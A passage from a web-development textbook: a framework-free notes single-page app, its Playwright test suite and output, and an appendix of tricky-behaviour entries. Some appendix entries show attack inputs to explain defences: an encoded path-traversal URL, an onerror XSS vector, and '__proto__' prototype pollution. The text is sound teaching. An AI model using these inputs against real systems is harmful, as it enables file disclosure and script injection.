### Mastery check

1. **Explain.** Why does the router ignore clicks with Ctrl or Cmd held down, and links with a `target`?

## Unit 17.4 — The API client, the views, and the shell

**One-line summary:** All network access goes through one small module that knows the URLs and turns error responses into exceptions carrying the server's validation details; each view is an `async` function that loads its data (cancellable), builds its DOM with a tiny element helper, sets the title, and reports status to a live region through a shared signal.

```js
// file: capstone/public/api.js
// The client for Chapter 16's API: one place for URLs, errors, and JSON.
export class ApiError extends Error {
  constructor(status, body) { super(body?.error ?? `HTTP ${status}`); this.status = status; this.details = body?.details ?? []; }
}
async function request(path, { method = "GET", body, signal } = {}) {
  const res = await fetch(`/api${path}`, { method, signal,
    headers: body ? { "Content-Type": "application/json" } : {}, body: body && JSON.stringify(body) });
  const data = res.status === 204 ? null : await res.json();
  if (!res.ok) throw new ApiError(res.status, data);
  return data;
}
export const listNotes = (after, signal) => request(`/notes?limit=5${after ? `&after=${after}` : ""}`, { signal });
export const getNote = (id, signal) => request(`/notes/${id}`, { signal });
export const createNote = (note) => request("/notes", { method: "POST", body: note });
export const deleteNote = (id) => request(`/notes/${id}`, { method: "DELETE" });
```

```js
// file: capstone/public/app.js
// Views and wiring. State that several views share lives in signals (Chapter 6).
import { signal, effect } from "/lib/signals.mjs";
import { createRouter } from "/router.js";
import * as api from "/api.js";

const h = (tag, props = {}, ...children) => {               // a tiny element builder: never parses HTML
  const el = Object.assign(document.createElement(tag), props);
  el.append(...children.flat().filter((c) => c != null && c !== false));
  return el;
};
const status = signal("");
effect(() => { document.getElementById("announcer").textContent = status.value; });

async function listView({ outlet, signal: abort }) {
  const items = [];
  let next = null;
  const list = h("ul");
  const more = h("button", { type: "button", textContent: "Load more" });
  async function load(after) {
    const page = await api.listNotes(after, abort);
    items.push(...page.items);
    next = page.items.length && page.next ? page.items.at(-1).id : null;
    list.append(...page.items.map((n) => h("li", {}, h("a", { href: `/notes/${n.id}`, textContent: n.title }), " ",
                                             n.status === "draft" && h("span", { className: "draft", textContent: "draft" }))));
    more.hidden = !next;
    status.value = `${items.length} note${items.length === 1 ? "" : "s"} shown`;
  }
  more.addEventListener("click", () => load(next));
  await load();
  document.title = "All notes";
  outlet.replaceChildren(h("h1", { textContent: "All notes" }),
    items.length ? list : h("p", { textContent: "No notes yet." }), more);
}

async function noteView({ outlet, params, signal: abort, navigate }) {
  const note = await api.getNote(params.id, abort);
  const del = h("button", { type: "button", textContent: "Delete" });
  del.addEventListener("click", async () => {
    await api.deleteNote(note.id);
    status.value = `Deleted "${note.title}"`;
    navigate("/", { replace: true });                        // replace: Back must not return to a deleted note
  });
  document.title = note.title;
  outlet.replaceChildren(h("h1", { textContent: note.title }), h("p", { textContent: note.body || "(empty)" }),
                         h("p", {}, h("small", { textContent: `${note.status}, updated ${new Date(note.updated).toLocaleString("en-GB")}` })), del);
}

async function newView({ outlet, navigate }) {
  const errors = h("ul", { className: "errors", id: "errors" });
  const form = h("form", { noValidate: true },
    h("p", {}, h("label", { textContent: "Title ", htmlFor: "title" }), h("input", { id: "title", name: "title" })),
    h("p", {}, h("label", { textContent: "Body ", htmlFor: "body" }), h("textarea", { id: "body", name: "body" })),
    h("p", {}, h("label", {}, h("input", { type: "checkbox", name: "publish" }), " Publish now")),
    errors, h("button", { textContent: "Save" }));
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const data = new FormData(form);
    try {
      const note = await api.createNote({ title: data.get("title"), body: data.get("body"),
                                          status: data.get("publish") ? "published" : "draft" });
      status.value = `Saved "${note.title}"`;
      navigate(`/notes/${note.id}`);
    } catch (err) {
      if (!(err instanceof api.ApiError)) throw err;
      errors.replaceChildren(...(err.details.length ? err.details : [err.message]).map((d) => h("li", { textContent: d })));
      status.value = `Not saved: ${err.details.length || 1} problem(s)`;
    }
  });
  document.title = "New note";
  outlet.replaceChildren(h("h1", { textContent: "New note" }), form);
}

function notFound({ outlet }) {
  document.title = "Not found";
  outlet.replaceChildren(h("h1", { textContent: "Page not found" }), h("p", {}, h("a", { href: "/", textContent: "All notes" })));
}

const router = createRouter([
  [/^\/$/, listView],
  [/^\/notes\/(?<id>\d+)$/, noteView],
  [/^\/new$/, newView],
  [/.*/, notFound],
], document.getElementById("main"), { onNavigate: (path) => console.log(`[router] ${path}`) });
router.start();
```

```html
<!-- file: capstone/public/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Notes</title>
  <link rel="stylesheet" href="/style.css">
  <script type="module" src="/app.js"></script>
</head>
<body>
  <a class="skip" href="#main">Skip to content</a>
  <header><nav aria-label="Main"><a href="/">All notes</a> <a href="/new">New note</a></nav></header>
  <main id="main"></main>
  <p id="announcer" class="visually-hidden" aria-live="polite"></p>
</body>
</html>
```

```css
/* file: capstone/public/style.css */
@layer base, layout, components;
@layer base {
  :root { color-scheme: light dark; font-family: system-ui, sans-serif; }
  *, *::before, *::after { box-sizing: border-box; }
}
@layer layout {
  body { max-width: 42rem; margin: 0 auto; padding: 1rem; }
  header nav { display: flex; gap: 1rem; padding-block: 0.5rem; }
}
@layer components {
  .visually-hidden { position: absolute; width: 1px; height: 1px; overflow: hidden; clip-path: inset(50%); white-space: nowrap; }
  .skip { position: absolute; left: -10000px; } .skip:focus { left: 1rem; }
  .errors { color: light-dark(#a00, #f88); }
  .draft { font-size: 0.8rem; padding: 0 0.4em; border: 1px solid; border-radius: 1em; }
  [aria-busy="true"] { opacity: 0.6; }
  main:focus { outline: none; }
}
```

```console
$ cd capstone && python3 ../../tools/page.py http://localhost:8170/ "click:text=New note" "fill:#title|Plan the trip" "click:text=Save" wait:300 "click:text=All notes" wait:300 "aria:body" --serve "node --disable-warning=ExperimentalWarning server.mjs"
[router] /
[router] /new
[router] /notes/1
[router] /
- link "Skip to content":
  - /url: "#main"
- banner:
  - navigation "Main":
    - link "All notes":
      - /url: /
    - link "New note":
      - /url: /new
- main:
  - heading "All notes" [level=1]
  - list:
    - listitem:
      - link "Plan the trip":
        - /url: /notes/1
      - text: draft
- paragraph: 1 note shown
$ cd capstone && cat public/*.js public/*.css ../../ch06/project/signals.mjs | wc -c && cat public/*.js public/*.css ../../ch06/project/signals.mjs | gzip -9 | wc -c
10602
3976
```

The router logged four navigations without a single page load. The accessibility tree shows the landmarks, the skip link, the heading, the list with its link and draft badge, and the live region's announcement. The whole client — router, views, API client, styles, and the signals library — is about 10 kB, 4 kB compressed: less than many frameworks' smallest builds, but also without their features (no keyed list diffing, no server rendering, no developer tools).

## Chapter 17 Project — Test the whole application

### Requirements

Write an end-to-end suite with Playwright Test that starts the server and covers: creating a note from an empty state; server-side validation errors displayed in the form; Back and Forward without page reloads, with focus on the new content; deep links on reload and the not-found route; cursor pagination with "Load more"; and deletion that cannot be undone with the Back button.

### Reference solution

```js
// file: capstone/playwright.config.js
import { defineConfig } from "@playwright/test";
export default defineConfig({
  testDir: ".",
  reporter: "list",
  use: { baseURL: "http://localhost:8170" },
  webServer: { command: "node --disable-warning=ExperimentalWarning server.mjs", url: "http://localhost:8170/" },
});
```

```js
// file: capstone/e2e.spec.js
// The whole application, end to end, as a user (and a screen reader) experiences it.
import { test, expect } from "@playwright/test";

test.describe.configure({ mode: "serial" });                 // one shared server and database, in order

test("starts empty, and creating a note shows it", async ({ page }) => {
  await page.goto("/");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("All notes");
  await expect(page.getByText("No notes yet.")).toBeVisible();
  await page.getByRole("link", { name: "New note" }).click();
  await expect(page).toHaveURL("/new");
  await page.getByLabel("Title").fill("Buy milk");
  await page.getByLabel("Body").fill("Two litres");
  await page.getByRole("button", { name: "Save" }).click();
  await expect(page).toHaveURL(/\/notes\/1$/);
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Buy milk");
  await expect(page.locator("#announcer")).toHaveText('Saved "Buy milk"');
});

test("the server's validation errors are shown in the form", async ({ page }) => {
  await page.goto("/new");
  await page.getByRole("button", { name: "Save" }).click();
  await expect(page.locator("#errors li")).toHaveText(["$.title: shorter than 1"]);
  await expect(page).toHaveURL("/new");
});

test("Back and Forward work without reloading the page", async ({ page }) => {
  await page.goto("/");
  await page.evaluate(() => (window.marker = "same document"));    // survives only if no reload happens
  await page.getByRole("link", { name: "Buy milk" }).click();
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Buy milk");
  await page.goBack();
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("All notes");
  await page.goForward();
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Buy milk");
  expect(await page.evaluate(() => window.marker)).toBe("same document");
  await expect(page.getByRole("main")).toBeFocused();          // focus moved to the new content
});

test("deep links work on reload, and unknown paths say so", async ({ page }) => {
  await page.goto("/notes/1");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Buy milk");
  await page.goto("/no/such/page");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Page not found");
});

test("pagination loads five notes at a time", async ({ page, request }) => {
  for (let i = 2; i <= 7; i++) await request.post("/api/notes", { data: { title: `Note ${i}`, body: "" } });
  await page.goto("/");
  await expect(page.getByRole("listitem")).toHaveCount(5);
  await page.getByRole("button", { name: "Load more" }).click();
  await expect(page.getByRole("listitem")).toHaveCount(7);
  await expect(page.getByRole("button", { name: "Load more" })).toBeHidden();
});

test("deleting returns to the list, and Back does not resurrect the note", async ({ page }) => {
  await page.goto("/");
  await page.getByRole("link", { name: "Buy milk" }).click();
  await page.getByRole("button", { name: "Delete" }).click();
  await expect(page).toHaveURL("/");
  await expect(page.getByRole("link", { name: "Buy milk" })).toHaveCount(0);
  await page.goBack();
  await expect(page).not.toHaveURL(/\/notes\/1$/);
});
```

```console
$ cd capstone && npm init -y > /dev/null && npm pkg set type=module && npm install --save-dev @playwright/test@1.63 2>&1 | tail -1
found 0 vulnerabilities
$ cd capstone && npx playwright test | cat

Running 6 tests using 1 worker

  ✓  1 e2e.spec.js:7:1 › starts empty, and creating a note shows it (374ms)
  ✓  2 e2e.spec.js:21:1 › the server's validation errors are shown in the form (182ms)
  ✓  3 e2e.spec.js:28:1 › Back and Forward work without reloading the page (221ms)
  ✓  4 e2e.spec.js:41:1 › deep links work on reload, and unknown paths say so (184ms)
  ✓  5 e2e.spec.js:48:1 › pagination loads five notes at a time (229ms)
  ✓  6 e2e.spec.js:57:1 › deleting returns to the list, and Back does not resurrect the note (256ms)

  6 passed (2.2s)
```

All six journeys pass. Two techniques in the suite are worth reusing: a value stored on `window` before navigating proves that Back and Forward did not reload the document (a reload would clear it); and the pagination test creates its data through the API with Playwright's `request` fixture instead of clicking through the form six times, keeping the test about pagination rather than about forms.

### Pattern

**P-16. Choose the simplest architecture that meets the requirements: a server-rendered site with a little JavaScript for documents and forms; a framework-free SPA like this one for small, long-lived tools; a framework (and its ecosystem of routers, data libraries, and developer tools) when the team, the number of views, or the complexity of shared state grows. Whatever you choose, the platform knowledge underneath — HTTP, the DOM, the event loop, accessibility, security — is the same.** *(Practice; Alex Russell, "The Market for Lemons" (2022) on the cost of JavaScript; Rich Harris, "Rethinking reactivity")* *Trade-off:* framework-free code avoids dependencies and upgrade churn but makes the team responsible for every solved problem — and for teaching the next developer how it works.

### Review checklist

- Rendering replaces the whole view on every navigation. Where would a keyed list update (changing only the rows that changed) matter, and how would you implement one?
- Add the offline behaviour of Chapter 12: a service worker for the shell and IndexedDB for notes.
- Add a Vite build (Chapter 9) and check the result with Chapter 13's measurements. What changes, and what stays the same?
- Add a strict Content Security Policy (Chapter 14) to the server. Does anything in the app violate it?

## Answers to the Chapter 17 prediction questions

**Unit 17.3, Q1.** Those clicks ask the browser to open the link in a new tab or window; intercepting them would break a basic browser feature that users rely on (and that a real link guarantees).

# Afterword

You have now built, from first principles, most of what a modern web application is made of: an HTTP server and a static file server, accessible documents and forms, layouts that adapt to any screen, a component styled with design tokens, a money library, a reactive state library, a task pool, an autocomplete widget that behaves like a native control, a validation library that generates types, a real-time chat, an offline-first app, a performance experiment, a hardened application, a test suite, a REST API, and a single-page application that ties them together. Frameworks will change; these foundations will not. The next book in this series, *React and Next.js from Zero to Advanced*, starts from exactly here.

# Appendix A — Index of Deep & Tricky entries and Patterns

Every *Deep & Tricky* entry (DT) and *Pattern* (P) in the book, in number order, with the unit where it is explained. Use it for revision: read each title and explain the entry before looking it up.

## Deep & Tricky

| # | Entry | Where |
| --- | --- | --- |
| DT-1 | HTTP header names are case-insensitive, and HTTP/2 and HTTP/3 transmit them in lower case only; Node.js lower-cases the names in `req.headers`, and the Fetch API's `Headers` object matches names case-insensitively — so code that looks up `req.headers["Content-Type"]` gets `undefined`, even though the client sent exactly `Content-Type`. | Unit 0.2 |
| DT-2 | `no-cache` does not mean "do not cache" — it means "cache, but revalidate before each use"; the directive that forbids storing is `no-store`. Conversely, a response with no caching headers at all may still be cached: browsers apply *heuristic freshness*, typically 10% of the time since `Last-Modified`, so a page last modified 10 days ago can be reused for a day without asking. | Unit 0.3 |
| DT-3 | Viewing the page source shows what the server sent; the browser's DevTools Elements panel and `document.body.innerHTML` show the DOM after error recovery and after scripts ran — and the two can differ in structure, not only in content. A CSS selector such as `p > div`, or a script that expects a `<div>` inside a `<p>`, fails against markup that "looks" right in the source. | Unit 0.4 |
| DT-4 | The URL parser removes `..` segments, but not an encoded slash: `/..%2fsecret.txt` reaches the server unchanged, decodes to `/../secret.txt`, and `path.join(ROOT, decoded)` — which joins first and normalises afterwards — produces a path *outside* the root. Normalising the decoded path on its own first (an absolute path cannot go above `/`), and then checking that the result is still inside the root, closes the hole; so does refusing any decoded path that contains `..`. | Chapter 0 Project |
| DT-5 | `aria-label` replaces the element's content as its accessible name — for a button containing visible text, speech-input users who say the visible words ("click Save") then cannot activate it, because the name is something else; and ARIA changes only what is exposed to assistive technology, never behaviour: `role="button"` does not make an element focusable or keyboard-operable. | Unit 1.3 |
| DT-6 | `minlength` and `maxlength` are checked only for values the *user* edited: a value set by script (or present in the HTML) that is too short does not set `tooShort`, so the "bad values" run above reports `"ab"` as valid, while the same two characters typed by a user make it invalid. Tests that set `.value` directly therefore never see length errors. | Unit 1.5 |
| DT-7 | The browser chooses from `srcset` using the `sizes` attribute, not the image's CSS width, because it must start the download before stylesheets and layout are done — so `sizes` is a promise, and a wrong one is silently obeyed: on the phone, the "half" image is *displayed* 188 px wide but `sizes` says `100vw`, so at density 3 the browser fetches the 1,600-px file where the 800-px file would have been enough. | Unit 1.6 |
| DT-8 | `novalidate` on the form turns off the browser's own blocking and bubbles, but not the constraints: `checkValidity()`, `validity`, `validationMessage`, and the `:invalid` selector keep working, which is how the project shows its own messages. And a custom error set with `setCustomValidity` stays until it is cleared with an empty string — forgetting to clear it leaves the field invalid forever. | Chapter 1 Project |
| DT-9 | The specificity of `:is()`, `:not()`, and `:has()` is that of their *most specific argument*, whether or not that argument matched — so `:is(#nav, .menu) a` costs (1,0,1) even on elements matched through `.menu`, and is hard to override; `:where()` has the same matching behaviour with zero specificity, which makes it the tool for defaults that should be easy to override. | Unit 2.2 |
| DT-10 | `!important` reverses every ordering of the cascade: user-agent important beats user important beats author important (the opposite of normal declarations), and among layers the *first* declared layer's important declarations win. A reset layer that marks something `!important` therefore cannot be overridden by any later layer's `!important` — only by an important declaration in an even earlier layer or by the user. | Unit 2.3 |
| DT-11 | A child's top margin can escape its parent: when a block has no top border, padding, or inline content before its first child, the first child's margin collapses with the parent's and appears *outside* the parent — moving the parent's background down with it, so "margin-top on the heading moved the whole section" is correct behaviour, not a bug. Padding, a border, `display: flow-root`, or flex/grid layout on the parent prevents it. | Unit 2.6 |
| DT-12 | `z-index` values are not global: they are compared only between siblings in the same stacking context, and many properties unrelated to stacking create one — `opacity` < 1, `transform`, `filter`, `will-change`, `contain: paint`, `mix-blend-mode`, and `position: fixed` or `sticky`. Adding a fade-in animation (opacity) or a transform to a card can therefore make its dropdown menu disappear behind the next card. The fix is to raise the *context* (give the card itself a `z-index` while the menu is open), or to render the menu outside the card — today with the `popover` attribute or `<dialog>`, which use the browser's top layer, above every stacking context. | Unit 3.2 |
| DT-13 | Flex and grid items have an automatic minimum size equal to their min-content size, so `flex: 1`, `1fr`, and `width: 100%` do not guarantee that a child fits: one long URL or code line can push a whole layout wider than the screen. `text-overflow: ellipsis` and `overflow-wrap` appear to "not work" in flex items for the same reason. Set `min-width: 0` on flex items and use `minmax(0, 1fr)` instead of `1fr` for grid tracks that hold arbitrary content. | Unit 3.4 |
| DT-14 | A `var()` that produces an invalid value for the property is not detected at parse time, so it does not fall back to an earlier declaration: the declaration becomes *invalid at computed-value time* and the property behaves as `unset` — inherited properties inherit, others take their initial value. In the example, `color: red; color: var(--space)` gives the inherited purple, not red. | Unit 4.1 |
| DT-15 | A nested rule's `&` is equivalent to wrapping the parent selector in `:is()`, so nested selectors inherit `:is()`'s specificity rule (DT-9): inside `#nav, .menu { & a { … } }`, the nested rule is `:is(#nav, .menu) a` and has specificity (1,0,1) even where it matched through `.menu` — unlike the Sass expansion `#nav a, .menu a`, whose two selectors have different specificities. | Unit 4.3 |
| DT-16 | An element cannot query itself — a container query looks for the nearest *ancestor* container — and `container-type: inline-size` applies size containment, so the container's own width can no longer depend on its content: a container in a shrink-to-fit context (an inline-block, a flex item with `flex: none`, a `width: fit-content` box) collapses to zero width. | Unit 4.4 |
| DT-17 | A transition needs a *before* style: if an element is created, or its style changed, and then changed again before the browser has computed its style, there is only one computed value and nothing to transition from — so adding a class right after inserting an element shows the end state instantly. Reading a computed value (`getComputedStyle(el).transform`, `el.offsetWidth`) forces a style computation in between; the modern alternative is `@starting-style { … }`, which declares the starting values for an element's first style change. | Unit 4.5 |
| DT-18 | Custom properties inherit their *computed* value, and `var()` references inside them are substituted where they are declared: `--accent: oklch(55% 0.18 var(--hue))` on `:root` is computed once, with the root's hue, and descendants inherit the finished colour — changing `--hue` further down changes nothing unless `--accent` is declared again on that element. Derived tokens must be declared on every element where their inputs can change (here `:root, [data-theme]`), and only those tokens — re-declaring independent tokens there would shadow overrides from above. | Chapter 4 Project |
| DT-19 | Rounding and formatting functions work on the binary value, not on the decimal you typed: `(1.005).toFixed(2)` is `"1.00"` and `Math.round(1.005 * 100) / 100` is 1 — because 1.005 is stored as 1.00499999999999989… — while `(1.0049999999999999).toFixed(2)` prints the same digits you would expect for 1.005. Money and other decimal quantities must be stored as integers of the smallest unit (cents), or handled by a decimal library, and rounded with integer arithmetic. | Unit 5.2 |
| DT-20 | In a browser, every classic script's top-level `var` and function declarations become properties of `window`, and `let`/`const` declarations go into a global lexical scope shared by all classic scripts — and both collide with the hundreds of properties `window` already has. `const top = 0` throws "Identifier 'top' has already been declared" because `window.top` is an unconfigurable property; `var name = 5` silently converts 5 to the string `"5"` (`window.name` is a string property that survives navigation); and elements with an `id` become global variables (`message.textContent`) *unless* `window` already has a property of that name, so `status` refers to the old `window.status` string, not the element. | Unit 5.5 |
| DT-21 | There are at least four "lengths" of a string, and each is right for a different job: UTF-16 code units (`.length` — storage and indexes), code points (`[...s].length` — Unicode processing), grapheme clusters (`Intl.Segmenter` — cursor movement, truncation, "characters" as users count them), and display columns (East Asian Width and emoji presentation — fixed-width layout), which no built-in API computes. A database column limit is usually yet another: UTF-8 bytes (`new TextEncoder().encode(s).length`). | Chapter 5 Project |
| DT-22 | A closure keeps alive the *variables* it can see, not copies of their values — and engines may keep the whole captured scope alive for as long as any closure created in it exists. A small event handler created in the same function as a large buffer can therefore keep the buffer in memory even if the handler never uses it, when another closure from that scope does: V8 allocates one context object per scope, shared by all its closures. | Unit 6.2 |
| DT-23 | Using an ordinary object as a dictionary of user-supplied keys is unsafe: keys such as `"constructor"`, `"toString"`, or `"hasOwnProperty"` are found on `Object.prototype` (`"constructor" in {}` is true), and assigning the key `"__proto__"` does not create a property at all but *changes the object's prototype* — the root of "prototype pollution" vulnerabilities when JSON input is merged into objects. Use `Map`, `Object.create(null)`, and `Object.hasOwn`. | Unit 6.4 |
| DT-24 | `break` inside `for…of` calls the iterator's `return()` method, which closes generators for good — but iterators without a `return` method, such as array and string iterators, are simply abandoned and can be resumed: the second loop above continues with 20 and 30. Conversely, a generator object passed to two loops yields nothing the second time, because the first `break` finished it. | Unit 6.6 |
| DT-25 | `process.nextTick` callbacks normally run before promise microtasks, but the top level of an ES module is itself evaluated inside a promise job, so the microtask queue is drained first and `nextTick` callbacks queued at module top level run after them. Code that relies on `nextTick` running "before any promise" behaves differently when a project switches from CommonJS to ES modules. | Unit 7.1 |
| DT-26 | `Promise.all` and `Promise.race` do not stop the other operations: when `all` rejects or `race` settles, the remaining promises keep running and their results — including later rejections — are silently ignored. A timeout written as `Promise.race([work(), timeout(1000)])` therefore leaves the slow work running, holding sockets or memory; only passing an `AbortSignal` into the work actually stops it. | Unit 7.4 |
| DT-27 | Any API that parses a string as HTML — `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `Range.createContextualFragment` — will create elements and attributes from data, so inserting user-supplied text with them is the most common cause of cross-site scripting (Chapter 14); `textContent`, `createElement` + properties, and `setAttribute` never parse. Script elements inserted through `innerHTML` do not run, but `<img src=x onerror=…>` does. | Unit 8.1 |
| DT-28 | `event.target` is the innermost element that was hit — often a `<span>` or `<svg>` inside the button you care about — while `event.currentTarget` is the element whose listener is running (and is `null` after the handler returns, e.g. when inspected later or in an `await`ed continuation). Delegation must therefore use `event.target.closest(selector)` and then check that the match is inside the container, or clicks on an icon inside a button are lost. | Unit 8.4 |
| DT-29 | `aria-activedescendant` and `aria-controls` refer to elements by `id`, and IDs are scoped to their tree: an input in the light DOM cannot point at an option inside a shadow root (or the reverse), because the reference simply does not resolve across the boundary. That is why the component keeps the input and the listbox in the *same* shadow root; cross-root ARIA references are still being standardised ("reference target"). | Chapter 8 Project |
| DT-30 | Module scripts are always fetched in CORS mode, and Chromium treats `file://` URLs as having an opaque origin, so a page opened from disk cannot load any module — not even one in the same folder; the same page works over `http://localhost`. Every module page in this book is therefore served, and a module served with the wrong `Content-Type` (anything but a JavaScript MIME type) is also refused, which static file servers that default to `application/octet-stream` get wrong. | Unit 9.1 |
| DT-31 | The "dual package hazard": a package that ships both a CommonJS and an ES module build can be loaded *twice* in one program — once through `require` and once through `import` — giving two copies of its module state, so an `instanceof` check fails across them and a singleton (a cache, a registry) exists twice. Shipping one format (ES modules, now that `require(esm)` works) avoids the hazard. | Unit 9.2 |
| DT-32 | Tree shaking can remove an unused export only if the bundler can prove that evaluating the module has no other effects: top-level code that does anything — registers a global, patches a prototype, or merely calls a function the bundler cannot see into — keeps the module, and sometimes the whole library, in the bundle. Libraries declare their modules effect-free with `"sideEffects": false` in `package.json`, and `/*#__PURE__*/` annotations mark individual calls; CommonJS modules generally cannot be tree-shaken at all. | Unit 9.4 |
| DT-33 | TypeScript's type system is deliberately unsound: the compiler accepts some programs whose values do not match their types at run time — assertions (`as`), `any`, `!`, method-parameter bivariance, array covariance, and index access without `noUncheckedIndexedAccess` — because the designers chose convenience and compatibility with existing JavaScript patterns over a proof of correctness. A type is a claim checked against other claims, never against the actual data. | Unit 10.5 |
| DT-34 | `fetch` refuses to connect to a list of "bad ports" — 1, 7, 9, 21, 22, 25, 110, 143, 6000, 6665–6669, and others used by non-HTTP protocols — and rejects with a `TypeError` before sending anything, even to `localhost`. The first draft of the client above used port 9 to provoke a "connection refused" error and got "bad port" instead. | Unit 11.1 |
| DT-35 | CORS is a browser-enforced read permission, not access control: a simple request (GET, HEAD, or a POST with a form content type) reaches the server and runs its side effects whether or not the response is allowed to be read, and non-browser clients such as `curl` ignore CORS entirely. Authorisation must therefore be checked on the server for every request, and state-changing endpoints must be protected against cross-site requests by other means (Chapter 14: CSRF). | Unit 11.2 |
| DT-36 | An IndexedDB transaction commits automatically as soon as no requests are pending when control returns to the event loop — so `await`-ing anything that is *not* an IndexedDB request in the middle of a transaction (a `fetch`, a timer, even some promise chains) lets it commit, and the next request throws `TransactionInactiveError`. Do all the asynchronous work first, then open a transaction and issue its requests without waiting on anything else. | Unit 12.3 |
| DT-37 | A new service worker does not take over while any page controlled by the old one is open: it installs and then *waits*, so users can run old code for days, and reloading one tab is not enough (the page is not unloaded before the next one is controlled). `skipWaiting()` and `clients.claim()` make the new worker take over at once — at the risk that an already-loaded page now talks to a worker (and caches) written for a newer version of the page. | Unit 12.4 |
| DT-38 | Transfer size and decoded size are different costs: a 46-KiB gzipped script is still 212 KiB of JavaScript to parse and compile, and a 500-KiB PNG of 600 × 375 pixels decodes to 600 × 375 × 4 = 900 KiB of memory whatever its file size. On low-end phones, parsing and executing JavaScript and decoding images often cost more time than downloading them; budgets should be set on decoded JavaScript size and image pixel counts, not only on bytes transferred. | Unit 13.3 |
| DT-39 | DevTools-style network throttling — used by this chapter's `--slow` option and by Lighthouse's "simulated" modes — adds the latency to each response as a whole, so navigation timing shows a fast `responseStart` (time to first byte) and a slow `responseEnd`; it also does not model TCP slow start, connection limits, or packet loss. Throttled lab numbers are useful for comparing two versions of a page, not as predictions of what users will see. | Chapter 13 Project |
| DT-40 | `SameSite` cookies stop requests from other *sites*, not other origins: a vulnerable page on any subdomain of your registrable domain (`blog.example.com`, an old marketing microsite, a user-content host) is same-site with `app.example.com`, so its requests carry `SameSite=Strict` cookies, and an XSS bug there can drive the main application. User-generated content belongs on a separate registrable domain (as `googleusercontent.com` and `githubusercontent.com` are), not a subdomain. | Unit 14.1 |
| DT-41 | Escaping depends on context: HTML-escaping (`&lt;`) is right for text between tags and inside quoted attributes, but not for unquoted attributes, URLs (`javascript:`), CSS, or JavaScript strings inside `<script>` — where `</script>` in the data ends the script block whatever JSON escaping was applied. Frameworks and template engines that escape by default (and the DOM's `textContent` and `setAttribute`) are safe for the contexts they understand; every "raw HTML" escape hatch — `innerHTML`, React's `dangerouslySetInnerHTML`, Vue's `v-html` — needs a sanitiser such as DOMPurify. | Unit 14.2 |
| DT-42 | Line and branch coverage measure which code ran, not which behaviour was checked: a test with no assertions gets the same coverage as a thorough one, and code reached with only "happy" inputs is fully covered while its edge cases are untested. Mutation testing (Stryker for JavaScript) measures the suite instead — it changes the code (`<` to `<=`, `+` to `-`) and reports mutations that no test notices. | Unit 15.2 |
| DT-43 | Most flaky end-to-end tests are timing bugs in the test: reading state once (`expect(await locator.count()).toBe(4)`) races with rendering, while the web-first form (`await expect(locator).toHaveCount(4)`) retries until the condition holds; likewise, listening for an event *after* triggering it (`await click(); await page.waitForEvent(...)`) can miss it, which is why the tests above create the `waitForEvent` promise before clicking. | Chapter 15 Project |
| DT-44 | Ignoring the return value of `write()` does not lose data — Node keeps buffering — so a producer faster than its consumer (a fast generator writing to a slow socket or disk) silently grows the buffer until the process runs out of memory, sometimes hours later in production. Honour `false` by awaiting `"drain"`, or use `stream.pipeline()`/`Readable.from()`, which do it for you. | Unit 16.2 |
| DT-45 | `server.close()` stops new connections but waits for existing ones to end, and HTTP keep-alive connections from clients (browsers, proxies, load balancers) may stay open, idle, for minutes — so a server that only calls `close()` can hang on shutdown until the orchestrator kills it. Close idle keep-alive connections explicitly (`server.closeIdleConnections()`, Node 18.2+), and set a deadline after which the process exits anyway. | Chapter 16 Project |
| DT-46 | A full page load tells assistive technology that the page changed — it announces the new title and starts reading from the top — but a client-side route change is just a DOM update, silent and with focus left on the link that no longer exists. Single-page applications must therefore update `document.title`, move focus to the new main content (or its heading), and announce changes through a live region; otherwise screen-reader users click a link and hear nothing at all. | Unit 17.3 |

## Patterns

| # | Pattern | Where |
| --- | --- | --- |
| P-1 | Put scripts in the `<head>` with `defer` (or use `type="module"`, which defers by default), use `async` only for independent scripts such as analytics, and never put a classic synchronous `<script src>` before content. | Unit 0.5 |
| P-2 | Use native elements first; reach for ARIA only to describe custom widgets that HTML lacks (tabs, tree views, comboboxes), and then follow the WAI-ARIA Authoring Practices pattern for that widget, including its keyboard behaviour. | Unit 1.7 |
| P-3 | Declare all cascade layers once, in order, at the top of the main style sheet (`@layer reset, vendor, components, utilities;`), keep selectors flat (one class where possible), and avoid `!important` except for utilities that must always win. | Unit 2.3 |
| P-4 | Design mobile-first: write the narrow layout as the default and add `min-width` media queries for wider screens; prefer intrinsic techniques (`auto-fill`/`minmax`, `clamp()`, `min()`, flex-wrap) to breakpoints, and put breakpoints where the content breaks, not at device widths. | Unit 3.6 |
| P-5 | Animate only `transform`, `opacity`, and `filter` where possible, keep durations short (100–300 ms for interface feedback), and honour `prefers-reduced-motion` globally, by setting a duration token to 0 or replacing motion with a fade. | Unit 4.5 |
| P-6 | Prefer composition — objects that hold other objects and plain functions — over deep inheritance hierarchies; use `extends` for genuine "is-a" relationships one or two levels deep, and `#private` fields for invariants that callers must not break. | Unit 6.5 |
| P-7 | Never block the main thread for more than about 50 ms: break loops over large data into chunks that yield, move pure computation (parsing, compression, image processing) to a Web Worker, and measure with the Long Tasks and Long Animation Frames APIs or the DevTools Performance panel. | Unit 7.5 |
| P-8 | Separate DOM reads from DOM writes: read all geometry first (or in a `ResizeObserver`/`IntersectionObserver` callback, which supply it), then write; schedule visual updates in `requestAnimationFrame`; build large subtrees off-document and insert them once. | Unit 8.5 |
| P-9 | Commit the lockfile, install with `npm ci` in automation, keep build output out of version control, and serve hashed assets with `Cache-Control: max-age=31536000, immutable` and the HTML with `no-cache`. | Unit 9.4 |
| P-10 | Model state as discriminated unions rather than objects of optional fields — `{ status: "loading" } ¦ { status: "error"; error: Error } ¦ { status: "done"; data: T }` instead of `{ loading?: boolean; error?: Error; data?: T }` — so that impossible combinations cannot be represented. | Unit 10.3 |
| P-11 | Session cookies should be `HttpOnly; Secure; SameSite=Lax` (or `Strict`), with a `__Host-` name prefix (which forces `Secure`, `Path=/`, and no `Domain`), and should never be readable by JavaScript; store nothing sensitive in cookies that scripts can read, and nothing at all that can be guessed. | Unit 12.1 |
